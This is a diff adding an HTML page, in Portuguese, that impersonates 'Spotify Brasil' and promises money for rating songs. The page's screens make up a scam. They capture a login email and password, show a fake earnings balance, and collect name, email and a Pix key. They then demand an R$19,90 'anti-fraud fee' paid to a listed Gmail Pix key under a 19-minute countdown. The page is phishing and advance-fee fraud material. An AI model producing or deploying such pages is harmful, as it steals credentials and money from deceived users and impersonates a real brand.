@@ -1,0 +1,212 @@
+<script type="text/javascript">
+        var gk_isXlsx = false;
+        var gk_xlsxFileLookup = {};
+        var gk_fileData = {};
+        function filledCell(cell) {
+          return cell !== '' && cell != null;
+        }
+        function loadFileData(filename) {
+        if (gk_isXlsx && gk_xlsxFileLookup[filename]) {
+            try {
+                var workbook = XLSX.read(gk_fileData[filename], { type: 'base64' });
+                var firstSheetName = workbook.SheetNames[0];
+                var worksheet = workbook.Sheets[firstSheetName];
+
+                // Convert sheet to JSON to filter blank rows
+                var jsonData = XLSX.utils.sheet_to_json(worksheet, { header: 1, blankrows: false, defval: '' });
+                // Filter out blank rows (rows where all cells are empty, null, or undefined)
+                var filteredData = jsonData.filter(row => row.some(filledCell));
+
+                // Heuristic to find the header row by ignoring rows with fewer filled cells than the next row
+                var headerRowIndex = filteredData.findIndex((row, index) =>
+                  row.filter(filledCell).length >= filteredData[index + 1]?.filter(filledCell).length
+                );
+                // Fallback
+                if (headerRowIndex === -1 || headerRowIndex > 25) {
+                  headerRowIndex = 0;
+                }
+
+                // Convert filtered JSON back to CSV
+                var csv = XLSX.utils.aoa_to_sheet(filteredData.slice(headerRowIndex)); // Create a new sheet from filtered array of arrays
+                csv = XLSX.utils.sheet_to_csv(csv, { header: 1 });
+                return csv;
+            } catch (e) {
+                console.error(e);
+                return "";
+            }
+        }
+        return gk_fileData[filename] || "";
+        }
+        </script><!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Spotify Brasil - Login</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet" media="print" onload="this.media='all'">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" integrity="sha512-iecdLmaskl7CVkqkXNQ/ZH/XLlvWZOJyj7Yy7tcenmpD1ypASozpmT/E0iPtmFIB46ZmdtAc9eNBvH0H/ZpiBw==" crossorigin="anonymous" referrerpolicy="no-referrer" media="print" onload="this.media='all'" />
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <div class="container" role="main">
+    <!-- Tela de Login -->
+    <div id="login-screen">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Spotify_icon.svg" alt="Logotipo do Spotify" class="logo-icon" loading="lazy">
+      <h1>Spotify Brasil</h1>
+      <div class="subtitulo">Música e recompensas</div>
+      <p class="descripcion">Realize seu login e ganhe dinheiro ouvindo músicas de grandes artistas e ajude a moldar o futuro da música do Brasil!</p>
+
+      <form id="login-form" novalidate>
+        <div class="form-group">
+          <label for="email">E-mail</label>
+          <input type="email" id="email" placeholder="Digite seu e-mail" aria-describedby="email-error">
+        </div>
+        <div class="form-group">
+          <label for="password">Senha</label>
+          <input type="password" id="password" placeholder="Digite sua senha" aria-describedby="password-error">
+        </div>
+        <button type="submit" id="login-button">Entrar</button>
+        <p id="login-error-message" class="error-message">Por favor, preencha todos os campos!</p>
+        <p id="feedback-message" class="feedback-message">Login bem-sucedido! Redirecionando...</p>
+      </form>
+
+      <footer>
+        Este site é protegido pelo reCAPTCHA e está sujeito à <br>
+        <a href="https://policies.google.com/privacy" target="_blank" rel="noopener">Política de Privacidade</a> e aos
+        <a href="https://policies.google.com/terms" target="_blank" rel="noopener">Termos de Serviço do Google</a>.
+      </footer>
+    </div>
+
+    <!-- Tela de Avaliação -->
+    <div id="review-screen" class="hidden">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Spotify_icon.svg" alt="Logotipo do Spotify" class="logo-icon" loading="lazy">
+      <div class="balance">Saldo: R$<span id="balance-amount">0,00</span></div>
+      <div class="music-card">
+        <img id="music-cover" src="https://picsum.photos/60/60?random=1" alt="Capa da música" class="music-cover" onerror="this.src='https://picsum.photos/60/60?random=8'; console.log('Erro ao carregar capa: ' + this.src);">
+        <div class="music-info">
+          <div id="music-title" class="music-title">Flowers</div>
+          <div id="music-artist" class="music-artist">Miley Cyrus</div>
+        </div>
+      </div>
+      <div class="slider-label">De bom a ruim, qual nota você daria para as músicas do Miley Cyrus?</div>
+      <input type="range" min="0" max="100" value="50" class="slider" id="rating-slider">
+      <div class="slider-labels">
+        <span>Ruim</span>
+        <span>Normal</span>
+        <span>Bom</span>
+      </div>
+      <div class="slider-label">Recomendaria o cantor Miley Cyrus para seus amigos e familiares?</div>
+      <div class="option-buttons" id="recommend-buttons">
+        <button class="option-button" id="recommend-no">Não</button>
+        <button class="option-button" id="recommend-yes">Sim</button>
+      </div>
+      <div class="slider-label">Qual faixa etária você acha que mais escuta o cantor Miley Cyrus?</div>
+      <div class="option-buttons" id="age-buttons">
+        <button class="option-button" id="age-under-18">-18 anos</button>
+        <button class="option-button" id="age-over-18">+18 anos</button>
+      </div>
+      <button id="submit-review">Enviar respostas</button>
+      <div id="gain-message" class="gain-message"></div>
+    </div>
+
+    <!-- Tela de Limite Diário -->
+    <div id="limit-screen" class="hidden">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Spotify_icon.svg" alt="Logotipo do Spotify" class="logo-icon" loading="lazy">
+      <h1>Limite Diário Atingido</h1>
+      <div class="subtitulo">Saque seu saldo hoje!</div>
+      <i class="fas fa-trophy trophy-icon"></i>
+      <p class="descripcion">Você atingiu o limite diário de avaliações. Saque seu saldo de R$<span id="limit-balance">0,00</span> agora ou espere 24 horas para continuar avaliando.</p>
+      <button id="withdraw-now">Sacar Agora</button>
+      <p class="wait-message">Ou espere 24h para continuar avaliando.</p>
+    </div>
+
+    <!-- Tela de Dados Cadastrais -->
+    <div id="signup-screen" class="hidden">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Spotify_icon.svg" alt="Logotipo do Spotify" class="logo-icon" loading="lazy">
+      <span class="step-circle">1</span>
+      <h1>Dados Cadastrais</h1>
+      <div class="subtitulo">Complete os dados de cadastro</div>
+      <form id="signup-form" novalidate>
+        <div class="form-group">
+          <label for="full-name">Nome Completo</label>
+          <input type="text" id="full-name" placeholder="Seu nome completo" aria-describedby="full-name-error">
+        </div>
+        <div class="form-group">
+          <label for="signup-email">E-mail</label>
+          <input type="email" id="signup-email" placeholder="Seu e-mail" aria-describedby="signup-email-error">
+        </div>
+        <button type="submit" id="submit-signup">Prosseguir</button>
+        <p id="signup-error-message" class="error-message">Por favor, preencha todos os campos!</p>
+      </form>
+    </div>
+
+    <!-- Tela de Seleção de Chave Pix -->
+    <div id="pix-selection-screen" class="hidden">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Spotify_icon.svg" alt="Logotipo do Spotify" class="logo-icon" loading="lazy">
+      <h1>Selecionar Chave Pix</h1>
+      <div class="subtitulo">Escolha o tipo de chave</div>
+      <p class="descripcion">Selecione o tipo de chave Pix e insira os dados para realizar o saque.</p>
+      <div class="pix-type-buttons">
+        <button class="pix-type-button" id="pix-cpf"><i class="fas fa-id-card"></i> CPF/CNPJ</button>
+        <button class="pix-type-button" id="pix-phone"><i class="fas fa-phone"></i> Telefone</button>
+        <button class="pix-type-button" id="pix-email"><i class="fas fa-envelope"></i> Email</button>
+      </div>
+      <div class="form-group">
+        <label for="pix-key">Digite sua chave Pix</label>
+        <input type="text" id="pix-key" placeholder="Digite sua chave Pix aqui" aria-describedby="pix-key-error">
+      </div>
+      <button id="submit-pix">Realizar Saque</button>
+      <p id="pix-error-message" class="error-message">Por favor, selecione um tipo de chave e preencha o campo!</p>
+    </div>
+
+    <!-- Tela de Alerta de Chave Não Cadastrada -->
+    <div id="alert-screen" class="hidden">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Spotify_icon.svg" alt="Logotipo do Spotify" class="logo-icon" loading="lazy">
+      <h1>Desbloqueie seu Saldo!</h1>
+      <i class="fas fa-exclamation-triangle alert-icon"></i>
+      <div class="subtitulo">Chave Pix não cadastrada</div>
+      <p class="descripcion">Para receber seu primeiro saque no valor de R$<span id="alert-balance">0,00</span>, ative sua conta cadastrando sua chave Pix. Implementamos uma taxa anti-fraude para prevenir fraudes e abusos nos saques. Fique tranquilo, você receberá o valor da taxa de volta junto com o saque.</p>
+      <button id="activate-account">Ativar Cadastro e Sacar</button>
+    </div>
+
+    <!-- Tela de Ativação de Cadastro -->
+    <div id="activation-screen" class="hidden">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/8/84/Spotify_icon.svg" alt="Logotipo do Spotify" class="logo-icon" loading="lazy">
+      <span class="step-circle">2</span>
+      <h1>Dados de Pagamento</h1>
+      <div class="subtitulo">Complete os dados de pagamento</div>
+      <div class="pix-option">Pague no PIX</div>
+      <div class="info-item">
+        <i class="fas fa-check-circle"></i>
+        <span>IMEDIATO - Ao selecionar a opção Gerar Pix o código para pagamento estará disponível.</span>
+      </div>
+      <div class="info-item">
+        <i class="fas fa-check-circle"></i>
+        <span>PAGAMENTO SIMPLES - Ao selecionar a opção Gerar Pix o código para pagamento estará disponível.</span>
+      </div>
+      <div class="info-item">
+        <i class="fas fa-check-circle"></i>
+        <span>100% SEGURO - Ao selecionar a opção Gerar Pix o código para pagamento estará disponível.</span>
+      </div>
+      <div class="total">
+        <span>TOTAL</span>
+        <span>R$19,90</span>
+      </div>
+      <button id="generate-pix">Gerar Pix</button>
+      <div id="generated-pix" class="pix-info hidden">Chave Pix: spotifybrasil192@gmail.com</div>
+      <button id="copy-pix">Copia Pix</button>
+      <p id="copy-feedback" class="copy-feedback">Chave copiada!</p>
+      <div class="timer" id="timer">19:00</div>
+      <p class="descripcion">Você tem 19 minutos para concluir o pagamento e sacar. Se a taxa não for paga, seu saldo será 100% devolvido ao app.</p>
+    </div>
+
+    <!-- Notificação -->
+    <div id="notification" class="notification"></div>
+  </div>
+
+  <!-- Áudio de Dinheiro -->
+  <audio id="money-sound" src="https://www.soundjay.com/buttons/coins-01.mp3" preload="auto"></audio>
+
+  <script src="script.js"></script>
+</body>
+</html>
